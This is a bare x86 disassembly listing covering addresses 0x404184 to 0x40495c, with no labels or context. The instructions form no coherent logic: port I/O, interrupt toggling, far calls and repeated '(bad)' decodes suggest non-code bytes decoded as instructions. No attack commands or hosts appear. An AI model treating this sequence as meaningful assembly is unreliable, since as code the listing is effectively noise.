  404184:	cmp    esi,0x46d0d982
  40418a:	jle    0x4041a6
  40418c:	or     BYTE PTR [eax+0x4e20a55e],dl
  404192:	adc    edi,DWORD PTR [esi+0x75]
  404195:	leave  
  404196:	lods   al,BYTE PTR ds:[esi]
  404197:	cli    
  404198:	mov    ecx,0x2de06031
  40419d:	loope  0x4041d3
  40419f:	jno    0x4041ff
  4041a1:	lea    ebp,[edx+edi*4+0x40]
  4041a5:	ret    0xc225
  4041a8:	call   0xacad9bf
  4041ad:	inc    BYTE PTR [esi+0x140757e7]
  4041b3:	mov    edx,0x7b1f85a2
  4041b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041b9:	jmp    0x40419f
  4041bb:	jb     0x4041ca
  4041bd:	popa   
  4041be:	ret    
  4041bf:	dec    ebp
  4041c0:	mov    WORD PTR [ecx+0x40f42d55],ds
  4041c6:	push   edi
  4041c7:	sub    BYTE PTR [edx+0x6],bl
  4041ca:	nop
  4041cb:	mov    ch,0x89
  4041cd:	push   edi
  4041ce:	je     0x4041d3
  4041d0:	imul   edx,ebx,0xffffffb4
  4041d3:	fadd   DWORD PTR [edx+0x242aecd4]
  4041d9:	mov    al,ds:0xd51d635d
  4041de:	nop
  4041df:	repnz xor BYTE PTR [ecx+0x471ffa37],cl
  4041e6:	popf   
  4041e7:	out    0x8e,eax
  4041e9:	and    DWORD PTR [edi],ecx
  4041eb:	mov    edx,gs
  4041ed:	cdq    
  4041ee:	xor    eax,0x70bbf6a8
  4041f3:	mov    esp,0x20c3c0c5
  4041f8:	cld    
  4041f9:	fsub   st(5),st
  4041fb:	mov    al,0x39
  4041fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041fe:	gs push edi
  404200:	add    dh,cl
  404202:	xchg   ebp,eax
  404203:	scas   al,BYTE PTR es:[edi]
  404204:	jmp    0xbc555e55
  404209:	sbb    esi,DWORD PTR [edx+0x12]
  40420c:	adc    al,0xba
  40420e:	fst    QWORD PTR [eax-0x5c1cfd0b]
  404214:	xchg   edi,eax
  404215:	in     al,dx
  404216:	pop    esi
  404217:	dec    edx
  404218:	stos   DWORD PTR es:[edi],eax
  404219:	leave  
  40421a:	imul   ecx,DWORD PTR [ecx+esi*2-0x204e59b8],0xffffffb1
  404222:	xor    bh,dl
  404224:	not    BYTE PTR [eax+0x54]
  404227:	push   eax
  404228:	sti    
  404229:	mov    dh,0x2a
  40422b:	lods   eax,DWORD PTR ds:[esi]
  40422c:	and    ch,bl
  40422e:	and    DWORD PTR [ebx+0x2a23f8b9],edi
  404234:	(bad)  [esp+ebp*8]
  404237:	mov    ds:0xb91ba3b2,eax
  40423c:	pop    ebp
  40423d:	out    0xd9,al
  40423f:	in     eax,dx
  404240:	fnstsw WORD PTR [edi+0x9]
  404243:	pop    ds
  404244:	push   es
  404245:	inc    ebx
  404246:	mov    esp,0xbafc71d2
  40424b:	inc    esi
  40424c:	scas   al,BYTE PTR es:[edi]
  40424d:	push   edi
  40424e:	fnstsw WORD PTR [eax+0x67]
  404251:	stos   BYTE PTR es:[edi],al
  404252:	call   DWORD PTR [ecx+0x78]
  404255:	neg    BYTE PTR [eax]
  404257:	mov    bl,BYTE PTR [ecx-0x23d18744]
  40425d:	mov    ds:0x9449795c,eax
  404262:	call   0x2632e7ac
  404267:	add    bh,BYTE PTR [eax+0x5cda9a75]
  40426d:	aas    
  40426e:	pop    ebp
  40426f:	rcpps  xmm4,XMMWORD PTR [edx]
  404272:	(bad)  
  404273:	cmp    BYTE PTR [ecx-0x4ae0ff38],dl
  404279:	rcl    BYTE PTR [ecx-0x18],0x85
  40427d:	add    ebx,DWORD PTR [ebx-0x13]
  404280:	neg    BYTE PTR [edx]
  404282:	aaa    
  404283:	push   edx
  404284:	mov    WORD PTR [ebx-0x6e],ss
  404287:	call   0x3b78f662
  40428c:	xor    DWORD PTR [edx-0x78],ebx
  40428f:	pop    eax
  404290:	xchg   edi,eax
  404291:	shl    esi,cl
  404293:	inc    esp
  404294:	sub    bh,BYTE PTR [esi+edi*2]
  404297:	arpl   WORD PTR [ebx+0x497ce0e2],ax
  40429d:	out    0x6f,al
  40429f:	adc    BYTE PTR [edi],al
  4042a1:	dec    esp
  4042a2:	push   es
  4042a3:	xchg   ebx,eax
  4042a4:	cdq    
  4042a5:	pop    ebp
  4042a6:	or     ebx,DWORD PTR ds:[eax]
  4042a9:	iret   
  4042aa:	adc    DWORD PTR [esi+0x403a50cc],edx
  4042b0:	mov    eax,ds:0x112dbcbc
  4042b5:	stc    
  4042b6:	sub    eax,0xfc05119a
  4042bb:	jecxz  0x40429b
  4042bd:	xchg   ecx,eax
  4042be:	int    0x68
  4042c0:	or     eax,0xbb58c5ea
  4042c5:	mov    ds:0x203e0d87,al
  4042ca:	pop    esi
  4042cb:	xor    DWORD PTR [esi],edx
  4042cd:	adc    DWORD PTR [esi-0x6a],eax
  4042d0:	or     DWORD PTR [edi-0x6901da33],ebx
  4042d6:	sub    DWORD PTR [eax+0x62],edx
  4042d9:	adc    BYTE PTR [esi],dl
  4042db:	jbe    0x4042b4
  4042dd:	sub    ecx,DWORD PTR [ebx+0x78b34f]
  4042e3:	sbb    DWORD PTR [edx+0x3a],eax
  4042e6:	stos   BYTE PTR es:[edi],al
  4042e7:	pusha  
  4042e8:	stos   DWORD PTR es:[edi],eax
  4042e9:	leave  
  4042ea:	add    edi,edx
  4042ec:	icebp  
  4042ed:	jmp    0x4042cc
  4042ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042f0:	in     al,dx
  4042f1:	daa    
  4042f2:	shl    BYTE PTR [ebx],1
  4042f4:	rol    BYTE PTR [eax+0x2a10df85],cl
  4042fa:	jge    0x4042ac
  4042fc:	mov    ecx,DWORD PTR [ebx-0x1be25f21]
  404302:	js     0x40428c
  404304:	ret    0x18b
  404307:	retf   0x84ba
  40430a:	lea    edi,[esi+ecx*4+0xd]
  40430e:	push   cs
  40430f:	sub    DWORD PTR [ecx+0x3974c0a8],esi
  404315:	pop    ecx
  404316:	dec    esp
  404317:	shl    DWORD PTR [eax],cl
  404319:	int3   
  40431a:	push   ebx
  40431b:	adc    al,0xb2
  40431d:	(bad)  
  40431e:	mov    ds:0xa55e3075,al
  404323:	and    eax,0xa8ddb1
  404328:	mov    WORD PTR [esp+esi*8+0x3d],ds
  40432c:	js     0x404382
  40432e:	fst    QWORD PTR [ecx+0x6f]
  404331:	clc    
  404332:	add    al,0x42
  404334:	dec    DWORD PTR [eax-0xfc0c57e]
  40433a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40433b:	sub    esp,DWORD PTR [ebx+0x6f]
  40433e:	xchg   ebp,eax
  40433f:	adc    DWORD PTR [edx],ebx
  404341:	imul   ebp,DWORD PTR [ebx+eiz*1+0x4],0xffffff99
  404346:	scas   al,BYTE PTR es:[edi]
  404347:	adc    al,al
  404349:	(bad)  
  40434b:	mov    bl,0x5d
  40434d:	sub    eax,0x37d007b2
  404352:	fdecstp 
  404354:	adc    BYTE PTR [edx+edx*1+0x45],0x3e
  404359:	loop   0x404307
  40435b:	clc    
  40435c:	repz clc 
  40435e:	(bad)  [edx-0x58c114bf]
  404364:	clc    
  404365:	sbb    al,0xd9
  404367:	xlat   BYTE PTR ds:[ebx]
  404368:	push   edx
  404369:	and    al,0xe9
  40436b:	dec    edx
  40436d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40436e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40436f:	int3   
  404370:	pop    ecx
  404371:	mov    dl,0xba
  404373:	sti    
  404374:	jb     0x404328
  404376:	or     bh,BYTE PTR es:[edx]
  404379:	xchg   esp,eax
  40437a:	call   0x6285081
  40437f:	sbb    eax,0x301de1ff
  404384:	xchg   ebp,eax
  404385:	xchg   esi,eax
  404386:	sar    BYTE PTR [ebx+0x12],0x75
  40438a:	xor    bl,BYTE PTR [ebx-0x7d]
  40438d:	mov    eax,0xa532520c
  404392:	arpl   WORD PTR [ebx+0x5a],bp
  404395:	(bad)  
  404396:	loope  0x40435f
  404398:	scas   eax,DWORD PTR es:[edi]
  404399:	or     BYTE PTR [ecx],0xff
  40439c:	mov    al,ds:0xd3dd41c7
  4043a1:	jne    0x40434c
  4043a3:	imul   esp,DWORD PTR [ecx],0xe551f999
  4043a9:	data16 into 
  4043ab:	std    
  4043ac:	in     al,0x92
  4043ae:	jecxz  0x404346
  4043b0:	fiadd  WORD PTR [ecx]
  4043b2:	popf   
  4043b3:	adc    BYTE PTR [ebx+0x652c4f00],ah
  4043b9:	xchg   esi,eax
  4043ba:	nop
  4043bb:	test   BYTE PTR [ebp+0x2738a2a7],0xeb
  4043c2:	ror    dh,0xbe
  4043c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043c6:	pushf  
  4043c7:	stc    
  4043c8:	out    dx,al
  4043c9:	(bad)
  4043cc:	sub    esp,DWORD PTR [edi]
  4043ce:	mov    ds:0x951cbde9,eax
  4043d3:	sbb    al,0x3d
  4043d5:	ret    0xfeca
  4043d8:	adc    DWORD PTR [ebp-0x6c],ebx
  4043db:	xlat   BYTE PTR ds:[ebx]
  4043dc:	iret   
  4043dd:	clc    
  4043de:	(bad)  [ebp-0x3bebbfdf]
  4043e4:	ja     0x40438e
  4043e6:	retf   
  4043e7:	scas   al,BYTE PTR es:[edi]
  4043e8:	and    esi,DWORD PTR [esi-0x3d]
  4043eb:	push   eax
  4043ec:	into   
  4043ed:	inc    eax
  4043ee:	xor    eax,0x4244b84
  4043f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043f4:	(bad)
  4043f7:	ins    BYTE PTR es:[edi],dx
  4043f8:	ret    
  4043f9:	hlt    
  4043fa:	add    al,0x7a
  4043fc:	xchg   edx,eax
  4043fd:	and    DWORD PTR [eax+0x70],ebp
  404400:	or     bh,BYTE PTR [edi-0x42]
  404403:	push   esi
  404404:	push   eax
  404405:	scas   eax,DWORD PTR es:[edi]
  404406:	fcomp  QWORD PTR [ebx]
  404408:	xchg   ebp,eax
  404409:	div    DWORD PTR [ebx+0x31cbab3b]
  40440f:	iret   
  404410:	outs   dx,BYTE PTR ds:[esi]
  404411:	xchg   edi,eax
  404412:	lock stos BYTE PTR es:[edi],al
  404414:	out    0x83,al
  404416:	push   0x6e
  404418:	xlat   BYTE PTR ds:[ebx]
  404419:	(bad)  
  40441a:	push   ss
  40441b:	xor    BYTE PTR [ebp+eiz*4+0x68],bh
  40441f:	seto   BYTE PTR [ebx+ebx*1-0x42]
  404424:	or     al,0x84
  404426:	sti    
  404427:	xor    BYTE PTR [ebx],al
  404429:	mov    esi,DWORD PTR [eax+0x3a2577f8]
  40442f:	jmp    0x57bf227
  404434:	inc    esp
  404435:	in     al,0x47
  404437:	imul   esp,edi,0x71
  40443a:	add    al,BYTE PTR [eax]
  40443c:	lea    ebx,[ebx+0x6e]
  40443f:	mov    cs,WORD PTR [ebx+eiz*4-0x2f]
  404443:	fsubr  QWORD PTR [eax+0x11]
  404446:	xor    bl,BYTE PTR [edi+0x49]
  404449:	sbb    bh,0xbc
  40444c:	adc    edx,0x66bf3f8
  404452:	xchg   esp,eax
  404453:	pop    ds
  404454:	mov    edx,0xfc982d09
  404459:	(bad)  
  40445b:	mov    esi,0x4f2e1c0c
  404460:	in     eax,0xff
  404462:	mov    cs:0x442e6941,eax
  404468:	jbe    0x40443d
  40446a:	mov    esi,ecx
  40446c:	add    DWORD PTR [edx-0x47164375],edx
  404472:	sbb    DWORD PTR [ebx+0x3c25e86d],0x4555e31b
  40447c:	xchg   ebp,eax
  40447d:	push   cs
  40447e:	dec    ebp
  40447f:	cld    
  404480:	push   es
  404481:	aaa    
  404482:	adc    DWORD PTR [edx-0x59993a2b],eax
  404488:	enter  0x54f9,0xe0
  40448c:	inc    ebx
  40448d:	jmp    0x404430
  40448f:	xor    dh,0xb2
  404492:	int3   
  404493:	sbb    ch,BYTE PTR [edx-0x6bdeeb10]
  404499:	push   edx
  40449a:	mov    bl,0xd5
  40449c:	jmp    0x192f8d25
  4044a1:	into   
  4044a2:	mov    fs,WORD PTR [esp+eiz*2]
  4044a5:	pop    esp
  4044a6:	xchg   DWORD PTR ds:0xdc547feb,esp
  4044ac:	or     esi,edi
  4044ae:	bound  ebx,QWORD PTR [ebx+0xf]
  4044b1:	mov    ds:0x14ed80de,eax
  4044b6:	push   0xffffffb2
  4044b8:	lods   al,BYTE PTR ds:[esi]
  4044b9:	cli    
  4044ba:	lahf   
  4044bb:	inc    ebx
  4044bc:	xchg   ebp,eax
  4044bd:	div    DWORD PTR [eax]
  4044bf:	inc    esi
  4044c0:	mov    ds:0x38d9278f,eax
  4044c5:	outs   dx,DWORD PTR ds:[esi]
  4044c6:	sub    ebp,edi
  4044c8:	xchg   DWORD PTR [edx],ecx
  4044ca:	jp     0x4044bd
  4044cc:	popf   
  4044cd:	(bad)  
  4044ce:	loopne 0x4044aa
  4044d0:	cdq    
  4044d1:	sti    
  4044d2:	inc    esi
  4044d3:	pop    eax
  4044d4:	inc    esp
  4044d5:	push   cs
  4044d6:	push   edi
  4044d7:	jge    0x4044b0
  4044d9:	(bad)  
  4044da:	xchg   edx,eax
  4044db:	add    ch,BYTE PTR [ecx+eax*1]
  4044de:	call   0xa38b5ea7
  4044e3:	push   bx
  4044e5:	icebp  
  4044e6:	dec    ebx
  4044e7:	std    
  4044e8:	jge    0x404481
  4044ea:	push   eax
  4044eb:	pop    eax
  4044ec:	xor    ebx,DWORD PTR ss:[ebp+eiz*1-0x36d5e3b]
  4044f4:	or     BYTE PTR [ebx-0x308de02c],dl
  4044fa:	pop    ebp
  4044fb:	fidivr WORD PTR [edi-0x33]
  4044fe:	pop    edi
  4044ff:	icebp  
  404500:	fisttp WORD PTR [ecx-0x57de4c39]
  404506:	scas   al,BYTE PTR es:[edi]
  404507:	add    al,cl
  404509:	test   al,0x79
  40450b:	es xchg ebx,eax
  40450e:	mov    ds:0xbe10e59e,al
  404513:	jmp    0x40458e
  404515:	pop    ss
  404516:	push   eax
  404517:	xor    bl,BYTE PTR [edi-0x75aa2021]
  40451d:	xchg   esi,esp
  40451f:	xor    ah,BYTE PTR [edi]
  404521:	xchg   ebp,eax
  404522:	das    
  404523:	lods   al,BYTE PTR ds:[esi]
  404524:	xlat   BYTE PTR ds:[ebx]
  404525:	sbb    esp,DWORD PTR [edx+ebx*2]
  404528:	cmp    al,BYTE PTR [ebp+0x4c]
  40452b:	fnstsw WORD PTR [edx-0x4f7830c1]
  404531:	loope  0x4044ef
  404533:	push   esp
  404534:	add    edi,eax
  404536:	xor    DWORD PTR [ecx-0x26],eax
  404539:	lds    ebp,FWORD PTR [ebp+0x118d9d3c]
  40453f:	sbb    eax,ebp
  404541:	or     DWORD PTR [ecx+0x3faadc9e],ecx
  404547:	loop   0x40451e
  404549:	xchg   DWORD PTR [ebx+0x2e],edx
  40454c:	xor    DWORD PTR [eax],esi
  40454e:	sar    BYTE PTR [ecx+esi*4-0x4ab4dea5],1
  404555:	xchg   ebp,eax
  404556:	dec    ebp
  404557:	cld    
  404558:	adc    ebx,ebx
  40455a:	ss out 0xe1,al
  40455d:	loopne 0x4045ae
  40455f:	mov    dl,0xa2
  404561:	pcmpeqd mm3,QWORD PTR [ebx]
  404564:	sbb    ecx,DWORD PTR [esi-0x3b]
  404567:	out    dx,al
  404568:	cmp    edx,DWORD PTR [edi-0x79]
  40456b:	in     al,0x55
  40456d:	fdivr  DWORD PTR [eax-0x7b]
  404570:	push   esi
  404571:	out    dx,eax
  404572:	enter  0xe273,0x5a
  404576:	xchg   ecx,eax
  404577:	retf   
  404578:	rcr    BYTE PTR [ecx],0x78
  40457b:	push   esp
  40457c:	xchg   esi,eax
  40457d:	adc    al,cl
  40457f:	or     cl,BYTE PTR ds:0xbc9aa62
  404585:	inc    ebx
  404586:	and    edx,ecx
  404588:	dec    edi
  404589:	les    esi,FWORD PTR [edx+0x331961a5]
  40458f:	mov    dh,0xa0
  404591:	call   0x2ddf:0x88f4fb50
  404598:	into   
  404599:	or     eax,0xca66c0a
  40459e:	les    ecx,FWORD PTR [edi+0x7d]
  4045a1:	cmp    eax,0x3aa8b77c
  4045a6:	mov    eax,0x52049767
  4045ab:	pushf  
  4045ac:	add    al,0xc2
  4045ae:	sbb    dh,ah
  4045b0:	outs   dx,DWORD PTR ds:[esi]
  4045b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045b2:	mov    bl,BYTE PTR [esi]
  4045b4:	rcr    DWORD PTR [esi-0x17],cl
  4045b7:	pop    es
  4045b8:	mov    bh,0xad
  4045ba:	(bad)  
  4045bb:	out    dx,al
  4045bc:	aam    0xba
  4045be:	in     eax,0xab
  4045c0:	aam    0x8c
  4045c2:	mul    DWORD PTR [ebp+eiz*1-0x48365f2a]
  4045c9:	into   
  4045ca:	jmp    0x404555
  4045cc:	cdq    
  4045cd:	push   cs
  4045ce:	ret    0xd604
  4045d1:	add    BYTE PTR [ebx-0x426b3597],dl
  4045d7:	jge    0x404620
  4045d9:	mov    bl,0x87
  4045db:	push   edi
  4045dc:	mov    cs,WORD PTR [esi]
  4045de:	pop    esi
  4045df:	jns    0x4045cb
  4045e1:	stos   BYTE PTR es:[edi],al
  4045e2:	mov    ah,0xdf
  4045e4:	iret   
  4045e5:	mov    ah,0xdd
  4045e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045e8:	cmc    
  4045e9:	ret    0x9d8a
  4045ec:	push   ss
  4045ed:	(bad)  
  4045f1:	in     al,dx
  4045f2:	mov    eax,0x9828b465
  4045f7:	adc    bl,dl
  4045f9:	and    DWORD PTR [esi-0x3014f6ee],ecx
  4045ff:	out    0xbc,al
  404601:	cli    
  404602:	xchg   DWORD PTR [esp+edx*2],ebx
  404605:	jnp    0x404661
  404607:	mov    ebp,0x4b156366
  40460c:	mov    ch,0x96
  40460e:	test   BYTE PTR [esi-0x11],ah
  404611:	xor    BYTE PTR [ebx+0x11ce7c2f],ah
  404617:	cmc    
  404618:	add    dh,ch
  40461a:	stos   BYTE PTR es:[edi],al
  40461b:	add    ecx,DWORD PTR [edi+0x5ca77188]
  404621:	dec    edi
  404622:	idiv   BYTE PTR [eax+0x4f58a692]
  404628:	int    0x70
  40462a:	inc    esi
  40462b:	das    
  40462c:	xor    BYTE PTR [bx+si+0x3e],ah
  404630:	in     eax,0xa5
  404632:	scas   al,BYTE PTR es:[edi]
  404633:	ss arpl di,di
  404636:	mov    ds:0xd0dfd5b9,al
  40463b:	xor    DWORD PTR [ecx+0x57],ecx
  40463e:	jno    0x40469c
  404640:	daa    
  404641:	sbb    al,0x35
  404643:	or     ch,0xde
  404646:	call   0x9fa2:0x88871e36
  40464d:	pop    ds
  40464e:	pop    ebp
  40464f:	hlt    
  404650:	pusha  
  404651:	sub    edi,ebx
  404653:	imul   BYTE PTR [ecx+0x3644f5fc]
  404659:	dec    esp
  40465a:	xor    al,0x1b
  40465c:	call   0xfb881cf4
  404661:	or     ah,BYTE PTR [edx-0x570fa252]
  404667:	push   cs
  404668:	dec    edi
  404669:	mov    cl,0x8b
  40466b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40466c:	jmp    ecx
  40466e:	repz jmp FWORD PTR [edi]
  404671:	jns    0x4046a7
  404673:	int    0x82
  404675:	xchg   BYTE PTR [eax+0x3a27d3bf],dh
  40467b:	mov    esp,DWORD PTR [ebx-0x2f4d12cf]
  404681:	dec    edx
  404682:	mov    esi,0xd5b469f
  404687:	mov    ebx,0xc3739663
  40468c:	or     eax,DWORD PTR [esi]
  40468e:	xchg   edx,eax
  40468f:	dec    esp
  404690:	mov    DWORD PTR [esi-0x11],ebx
  404693:	inc    esi
  404694:	jne    0x4046d7
  404696:	sbb    al,0xcd
  404698:	imul   BYTE PTR [esi+edx*4-0x4c114dc4]
  40469f:	int3   
  4046a0:	div    BYTE PTR [ebp-0x4b52c4f1]
  4046a6:	bound  ebx,QWORD PTR [ecx-0x6c621c1e]
  4046ac:	popf   
  4046ad:	sub    al,0x57
  4046af:	dec    edx
  4046b0:	fiadd  WORD PTR [esi-0x6f]
  4046b3:	pusha  
  4046b4:	dec    edx
  4046b5:	dec    esp
  4046b6:	shr    BYTE PTR [ecx+0x63eec346],cl
  4046bc:	mov    ecx,0xbfdd944c
  4046c1:	mov    eax,ds:0x283cc4b2
  4046c6:	scas   eax,DWORD PTR es:[edi]
  4046c7:	xchg   esi,eax
  4046c8:	mov    al,0x53
  4046ca:	arpl   WORD PTR [ebx],sp
  4046cc:	add    dl,BYTE PTR [ebp+0x7b]
  4046cf:	mov    esi,0x69ed9939
  4046d4:	and    ecx,DWORD PTR [ebx-0x70]
  4046d7:	pop    edx
  4046d8:	push   0x3845c5f8
  4046dd:	imul   ebx,edx,0x9d57e429
  4046e3:	out    0xa9,eax
  4046e5:	sahf   
  4046e6:	mov    bl,0x2b
  4046e8:	stc    
  4046e9:	jg     0x4046c1
  4046eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046ec:	xor    BYTE PTR ds:0xe722a8d1,cl
  4046f2:	add    al,0x54
  4046f4:	stos   DWORD PTR es:[edi],eax
  4046f5:	xor    al,0x71
  4046f7:	or     DWORD PTR [esp+eiz*2-0x24dbf66c],ecx
  4046fe:	imul   esp,DWORD PTR [ebp+0x28f1cd1f],0x69
  404705:	icebp  
  404706:	and    al,ch
  404708:	jmp    0x4046c6
  40470a:	pop    esp
  40470b:	dec    ebp
  40470c:	adc    eax,DWORD PTR ds:0xfbac69f4
  404712:	fwait
  404713:	sbb    BYTE PTR [edx],ch
  404715:	push   0x7bd9b096
  40471a:	ficomp WORD PTR ds:0x5bfce7a1
  404720:	push   esp
  404721:	xchg   esi,eax
  404722:	mov    dl,0x2f
  404724:	fistp  DWORD PTR ds:0x92802fdc
  40472a:	data16 aad 0x89
  40472d:	dec    eax
  40472e:	not    BYTE PTR [eax-0x64b7b277]
  404734:	sub    BYTE PTR [eax-0x67],dh
  404737:	jo     0x404771
  404739:	jmp    0xb72050d
  40473e:	cdq    
  40473f:	sub    BYTE PTR [eax+0x455c1ce0],0x97
  404746:	ds nop
  404748:	cmp    dl,ch
  40474a:	les    ebx,FWORD PTR [edx-0x63]
  40474d:	xchg   ebx,eax
  40474e:	pop    edi
  40474f:	xchg   ebx,eax
  404750:	loope  0x404765
  404752:	push   0xffffff82
  404754:	cmp    BYTE PTR [esi],cl
  404756:	cmp    DWORD PTR [edi],esi
  404758:	call   0xacbb:0x93d3279a
  40475f:	mov    cl,0x59
  404761:	xor    eax,0x7f1cd60c
  404766:	in     eax,dx
  404767:	xchg   BYTE PTR [eax+0x64],bl
  40476a:	xor    DWORD PTR [ecx],edi
  40476c:	in     al,0xc3
  40476e:	dec    esp
  40476f:	call   0x320d:0xbcb25304
  404776:	ret    0x701f
  404779:	jp     0x40470d
  40477b:	cwde   
  40477c:	and    eax,0x3768194c
  404781:	cmp    ecx,DWORD PTR [ebp-0x60]
  404784:	push   0x51
  404786:	and    eax,0xcdb31171
  40478b:	ins    BYTE PTR es:[edi],dx
  40478c:	lods   eax,DWORD PTR ds:[esi]
  40478d:	int3   
  40478e:	inc    esp
  40478f:	push   esp
  404790:	pop    ss
  404791:	add    BYTE PTR es:0xb1c3dd71,cl
  404798:	popf   
  404799:	cmp    al,0x8a
  40479b:	dec    ebx
  40479c:	das    
  40479d:	pop    ecx
  40479e:	sbb    dh,dl
  4047a0:	hlt    
  4047a1:	jle    0x4047b0
  4047a3:	cmp    eax,0xc55bf5ae
  4047a8:	packuswb mm0,QWORD PTR [esi+0x4248fb2b]
  4047af:	sub    edi,DWORD PTR [ecx]
  4047b1:	xchg   BYTE PTR ds:0x94ef1262,cl
  4047b7:	ins    BYTE PTR es:[edi],dx
  4047b8:	dec    eax
  4047b9:	in     eax,dx
  4047ba:	jno    0x404797
  4047bc:	fistp  DWORD PTR [ebx+0x2a]
  4047bf:	outs   dx,BYTE PTR ds:[esi]
  4047c0:	xchg   ebp,eax
  4047c1:	xchg   ebp,eax
  4047c2:	mov    ds:0x20798245,eax
  4047c7:	aad    0x86
  4047c9:	pop    eax
  4047ca:	xchg   BYTE PTR [ebx],cl
  4047cc:	adc    edx,eax
  4047ce:	ins    DWORD PTR es:[edi],dx
  4047cf:	sub    esi,DWORD PTR [edi-0x3afead61]
  4047d5:	(bad)  [ecx+0x6c]
  4047d8:	out    dx,al
  4047d9:	sbb    al,0x99
  4047db:	mov    BYTE PTR [edi-0x6e2a1519],bl
  4047e1:	inc    esp
  4047e2:	inc    ecx
  4047e3:	and    eax,0x1eac7339
  4047e8:	sub    DWORD PTR [eax+0x658a16a],edi
  4047ee:	cmp    eax,0x817ae9d8
  4047f3:	rcr    BYTE PTR [ecx],1
  4047f5:	inc    esp
  4047f6:	test   DWORD PTR [edi+0x240b1832],esi
  4047fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047fd:	and    edx,DWORD PTR [esi]
  4047ff:	or     al,0x80
  404801:	or     bh,0xda
  404804:	ss inc ebp
  404806:	call   0x11dd:0x28aa8483
  40480d:	ror    BYTE PTR [eax-0x3a],0x5e
  404811:	mov    bh,0xfe
  404813:	ja     0x4047e7
  404815:	mov    eax,0x689cd9d0
  40481a:	stos   DWORD PTR es:[edi],eax
  40481b:	hlt    
  40481c:	and    DWORD PTR [ecx-0x2d],0x39
  404820:	out    0x8d,eax
  404822:	jp     0x404841
  404824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404825:	mov    ah,0x96
  404827:	pop    ebx
  404828:	pop    edi
  404829:	jns    0x4047c1
  40482b:	sahf   
  40482c:	test   BYTE PTR [esi-0x29],0xac
  404830:	mul    DWORD PTR [ebx+0x6e]
  404833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404834:	popf   
  404835:	push   ebp
  404836:	adc    dh,0x65
  404839:	xchg   edx,eax
  40483a:	ja     0x4047f2
  40483c:	add    eax,0xe8e4accd
  404841:	out    dx,al
  404842:	pop    es
  404843:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404844:	inc    edx
  404845:	outs   dx,BYTE PTR ds:[esi]
  404846:	fwait
  404847:	xor    eax,0xaea0f015
  40484c:	jns    0x40489c
  40484e:	and    edi,DWORD PTR [edi-0x56592c7]
  404854:	(bad)  
  404855:	mov    dl,0x43
  404857:	xchg   ecx,eax
  404858:	pop    esi
  404859:	js     0x404801
  40485b:	popf   
  40485c:	adc    al,0x7c
  40485e:	call   0x48cc:0xacf644ce
  404865:	sbb    DWORD PTR [ebp-0x7b2e4f3d],esi
  40486b:	push   0x3bb0a204
  404870:	cwde   
  404871:	mov    WORD PTR [edi-0x26507dcf],gs
  404877:	ficom  DWORD PTR [ebp+0x60563b5e]
  40487d:	and    BYTE PTR [edi-0x1d],bh
  404880:	retf   0xe292
  404883:	loope  0x404890
  404885:	dec    edx
  404886:	xlat   BYTE PTR ds:[ebx]
  404887:	cmc    
  404888:	sub    DWORD PTR ds:0xb3169e64,esp
  40488e:	adc    al,0x7f
  404890:	rcr    DWORD PTR [ebx-0x6b1bf6f3],cl
  404896:	push   DWORD PTR [edi]
  404898:	sti    
  404899:	shl    DWORD PTR [esi+0x639a4a5b],0x50
  4048a0:	mov    dh,0xc2
  4048a2:	js     0x4048a6
  4048a4:	cmp    al,0xe0
  4048a6:	mov    edx,0x5ccf538a
  4048ab:	and    eax,0x46dfdae3
  4048b0:	or     dl,BYTE PTR [eax]
  4048b2:	in     eax,dx
  4048b3:	sbb    ch,ah
  4048b5:	sub    eax,0x211e4115
  4048ba:	cli    
  4048bb:	das    
  4048bc:	mov    eax,ds:0x6fb5ef92
  4048c1:	sahf   
  4048c2:	ds bnd ret 0xbcb7
  4048c7:	loopne 0x40493a
  4048c9:	js     0x4048f4
  4048cb:	aam    0x39
  4048cd:	lock add bl,BYTE PTR [esi]
  4048d0:	mov    al,ds:0x3d325d8f
  4048d5:	iret   
  4048d6:	mov    ebx,0xdc1f0c10
  4048db:	fstp   QWORD PTR [eax+esi*1]
  4048de:	ficomp DWORD PTR [edi+esi*2+0x6779651]
  4048e5:	scas   eax,DWORD PTR es:[edi]
  4048e6:	push   edi
  4048e7:	in     eax,0xc3
  4048e9:	stos   BYTE PTR es:[edi],al
  4048ea:	xor    DWORD PTR [edx],ebp
  4048ec:	sub    al,0xef
  4048ee:	(bad)  
  4048f1:	cmp    eax,0x3829269f
  4048f6:	or     eax,edx
  4048f8:	jmp    DWORD PTR [edx-0x64772c5c]
  4048fe:	(bad)  
  4048ff:	mov    al,0x3
  404901:	(bad)  
  404902:	shl    BYTE PTR ds:0x76830440,cl
  404908:	jae    0x404966
  40490a:	cmp    eax,0xa67e6b53
  40490f:	adc    ecx,DWORD PTR [eax]
  404911:	ja     0x4048e2
  404913:	pop    esi
  404914:	jb     0x40494d
  404916:	test   al,0xb
  404918:	push   0x186b6988
  40491d:	mov    fs,WORD PTR [esi-0x5240b216]
  404923:	dec    ebx
  404924:	mov    ecx,ebx
  404926:	mov    edi,0x446cc837
  40492b:	jne    0x404953
  40492d:	and    eax,0xd7d98063
  404932:	cli    
  404933:	(bad)  
  404934:	in     al,0x26
  404936:	push   ds
  404937:	(bad)  
  404938:	push   DWORD PTR ds:0x616a2abb
  40493e:	int3   
  40493f:	push   edi
  404940:	mov    ebp,0xdd8e9e47
  404945:	mov    eax,0xc2d76d7e
  40494a:	ret    0x7b22
  40494d:	das    
  40494e:	call   0x9334:0x4e559a43
  404955:	ror    DWORD PTR [edx+0x2f],0xf3
  404959:	retf   0x32a9
  40495c:	xchg   esp,eax
